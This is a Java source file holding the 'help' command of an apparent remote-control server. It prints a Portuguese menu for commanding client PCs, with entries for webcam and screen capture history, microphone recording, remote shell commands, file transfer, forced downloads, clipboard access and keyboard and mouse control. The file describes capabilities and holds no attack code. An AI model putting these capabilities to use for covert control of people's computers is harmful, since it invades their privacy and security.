package br.com.introcdc.connect.server.commands.info;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:43
 */

import br.com.introcdc.connect.server.command.ServerCommand;

public class ServerCommandHelp extends ServerCommand {

    public ServerCommandHelp() {
        super("help");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        msg("Comandos:");
        msg("sel (id/all) | Selecionar um cliente");
        msg("list | Listar os clientes");
        msg("help | Listar os comandos");
        msg("desel | Resetar a seleção de cliente");
        msg("info | Receber todas as informações do pc do usuário");
        msg("debug | Ativar ou desativar o modo debug");
        msg("control | Ativar ou desativar o modo de control remoto");
        msg("keyboard/mouse/mousemove | Ativar ou desativar os controles individualmente");
        msg("duplicate | Ativar ou desativar o modo de desconectar duplicata");
        msg("fps (fps) | Selecionar a quantidade de FPS por padrão");
        msg("ping | Verificar o ping com o cliente");
        msg("ls | Listar os arquivos na pasta atual");
        msg("del (arquivo/pasta) | Apagar um arquivo");
        msg("copy (arquivo/pasta)-/-(arquivo/pasta) | Copiar um arquivo ou pasta para um arquivo ou pasta");
        msg("move (arquivo/pasta)-/-(arquivo/pasta) | Mover um arquivo ou pasta para um arquivo ou pasta");
        msg("mkdir (pasta) | Criar uma pasta");
        msg("cd (pasta) | Acessar uma pasta");
        msg("view (arquivo) | Visualizar uma imagem rapidamente");
        msg("receive (arquivo/pasta) | Receber um arquivo ou pasta");
        msg("send (arquivo/pasta) | Enviar um arquivo ou pasta");
        msg("download (url) | Fazer o cliente baixar um arquivo");
        msg("zip (file) | Fazer o cliente criar um .zip");
        msg("unzip (file) | Fazer o cliente extrair um arquivo .zip");
        msg("type (texto) | Fazer o teclado digitar um texto");
        msg("lclick/mclick/rclick (x) (y) | Fazer o mouse do cliente clicar");
        msg("scroll (quantidade) | Fazer o scroll do mouse movimentar");
        msg("history (screen/webcam) | Receber o histórico de prints da tela ou webcam");
        msg("audio (controls/receive/send/segundos) | Enviar áudio do microfone vice-verse ou gravar áudio por uma quantidade de segundos");
        msg("screen (monitor) | Tirar um print da tela do usuário");
        msg("webcam (id) | Tirar um print da webcam do usuário");
        msg("livestopper | Ativar ou desativar o parador automático de transmissão");
        msg("cmd (comando) | Enviar um comando para o console do usuário");
        msg("exec (comando) | Enviar um comando para algum processo rodando no usuário");
        msg("log (id) | Receber logs de um processo iniciado");
        msg("kill (id) | Matar um processo iniciado");
        msg("listprocess | Listar processos iniciados");
        msg("clipboard (<<</texto) | Receber ou definir um texto na clipboard");
        msg("msg (mensagem) | Enviar mensagem ao cliente");
        msg("ask (pergunta) | Enviar mensagem com caixa de diálogo ao cliente");
        msg("chat | Abrir o chat de conversa com o cliente");
        msg("voice (texto) | Fazer no computador do cliente digitar uma voz");
        msg("update | Verificar se tem atualização");
        msg("close | Fechar o processo do cliente");
        msg("uninstall | Desinstalar o programa do cliente");
    }

}
